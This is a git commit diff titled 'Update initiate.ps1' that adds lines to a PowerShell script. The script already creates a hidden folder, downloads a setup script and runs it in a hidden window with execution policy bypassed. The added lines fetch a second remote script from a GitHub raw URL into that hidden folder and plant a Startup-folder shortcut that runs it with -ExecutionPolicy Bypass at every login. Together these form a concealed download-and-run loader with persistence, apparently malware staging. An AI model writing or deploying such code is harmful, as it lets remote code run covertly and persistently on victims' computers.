dfe4fdce2d6dfebcd8e4f927b672f471ca62a404
N8crawler2139 <129456105+N8crawler2139@users.noreply.github.com>
2023-04-07 10:17:11 -0600

    Update initiate.ps1

--- initiate.ps1
+++ initiate.ps1
@@ -6,4 +6,15 @@ if (-not (Test-Path $hiddenFolderPath)) {
     Set-ItemProperty -Path $hiddenFolderPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
 }
 Invoke-WebRequest -Uri $url -OutFile $setupScriptPath
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/N8crawler2139/MyCode/main/startup -OutFile "$env:LOCALAPPDATA\HiddenSqliteFolder\startup.ps1"
+
+$ShortcutPath = [System.IO.Path]::Combine([Environment]::GetFolderPath('Startup'), 'MyStartupScript.lnk')
+$WshShell = New-Object -ComObject WScript.Shell
+$Shortcut = $WshShell.CreateShortcut($ShortcutPath)
+$Shortcut.TargetPath = "powershell.exe"
+$Shortcut.Arguments = "-ExecutionPolicy Bypass -File `"$($env:LOCALAPPDATA)\HiddenSqliteFolder\startup.ps1`""
+$Shortcut.IconLocation = "powershell.exe"
+$Shortcut.WorkingDirectory = $PSScriptRoot
+$Shortcut.Save()
+
 Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$setupScriptPath`"" -WindowStyle Hidden
